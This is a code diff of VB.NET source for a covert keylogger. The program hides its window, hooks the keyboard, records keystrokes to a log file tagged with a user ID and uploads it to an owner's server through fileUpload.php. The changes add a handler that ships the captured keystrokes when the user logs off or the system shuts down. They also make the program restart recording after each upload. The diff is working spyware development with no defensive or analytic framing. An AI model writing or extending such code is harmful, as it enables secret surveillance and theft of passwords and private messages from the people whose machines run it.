@@ -2,7 +2,6 @@
 Public Class Main
     Dim threadkeylogger As Threading.Thread
     Dim keyloggerLog As String = Nothing
-    Dim isLoggerSwitch As Boolean = False
     Dim isLoggin As Boolean = False
 
     Private WithEvents kbHook As KeyboardHook
@@ -16,22 +15,21 @@ Public Class Main
         Me.Hide()
         CheckForIllegalCrossThreadCalls = False
         parameters = Command()
-        ReadParameters(parameters)
         StartUp.Init()
+        ReadParameters(parameters)
+        AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf SessionEvent
     End Sub
 
     Sub StartRecording()
-        AddToLog("StartRecording@Main", "Starting record...", False)
+        AddToLog("StartRecording@Main", "Inicializing record...", False)
         Try
-            If Not isLoggerSwitch Then
-                isLoggerSwitch = True
-                If Not isLoggin Then
-                    isLoggin = True
-                    kbHook = New KeyboardHook()
-                    AddHandler kbHook.KeyUp, AddressOf kbHook_KeyUp
-                End If
+            If Not isLoggin Then
+                AddToLog("StartRecording@Main", "Starting recording...", False)
+                isLoggin = True
+                kbHook = New KeyboardHook()
+                AddHandler kbHook.KeyUp, AddressOf kbHook_KeyUp
             Else
-                isLoggerSwitch = False
+                AddToLog("StartRecording@Main", "Already recording...", False)
             End If
         Catch ex As Exception
             AddToLog("StartRecording@Main", "Error: " & ex.Message, True)
@@ -40,16 +38,21 @@ Public Class Main
     Sub StopRecording()
         AddToLog("StopRecording@Main", "Stopping record...", False)
         Try
-            kbHook.FinalizeHK()
+            If isLoggin Then
+                kbHook.FinalizeHK()
+            End If
             End
         Catch ex As Exception
             AddToLog("StopRecording@Main", "Error: " & ex.Message, True)
+            End
         End Try
     End Sub
     Sub SendRecord()
         AddToLog("SendRecord@Main", "Sending record...", False)
         Try
-            kbHook.FinalizeHK()
+            If isLoggin Then
+                kbHook.FinalizeHK()
+            End If
             Dim fileName As String = "usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_Keylogger.log"
             Dim filePath As String = DIRCommons & "\" & fileName
             If My.Computer.FileSystem.FileExists(filePath) Then
@@ -57,7 +60,9 @@ Public Class Main
             End If
             My.Computer.FileSystem.WriteAllText(filePath, keyloggerLog, False)
             My.Computer.Network.UploadFile(filePath, HttpOwnerServer & "/fileUpload.php")
-            End
+            isLoggin = False
+            ResetRecord()
+            StartRecording()
         Catch ex As Exception
             AddToLog("SendRecord@Main", "Error: " & ex.Message, True)
         End Try
@@ -79,7 +84,7 @@ Public Class Main
     End Sub
 
     Sub AddKeyToLog(ByVal key As String)
-        If isLoggerSwitch Then
+        If isLoggin Then
             Select Case key.ToUpper
                 Case "SPACE"
                     key = " {" & key.ToUpper & "} "
@@ -94,6 +99,24 @@ Public Class Main
             keyloggerLog &= key
             'Console.WriteLine(key)
         End If
+    End Sub
+
+    Sub SessionEvent(ByVal sender As Object, ByVal e As Microsoft.Win32.SessionEndingEventArgs)
+        Try
+            If e.Reason = Microsoft.Win32.SessionEndReasons.Logoff Then
+                AddToLog("SessionEvent", "User is logging off!", True)
+            ElseIf e.Reason = Microsoft.Win32.SessionEndReasons.SystemShutdown Then
+                AddToLog("SessionEvent", "System is shutting down!", True)
+            Else
+                AddToLog("SessionEvent", "Something happend!", True)
+            End If
+            If isLoggin Then
+                SendRecord()
+                End
+            End If
+        Catch ex As Exception
+            AddToLog("SessionEvent@Init", "Error: " & ex.Message, True)
+        End Try
     End Sub
 End Class
 Public Class KeyboardHook
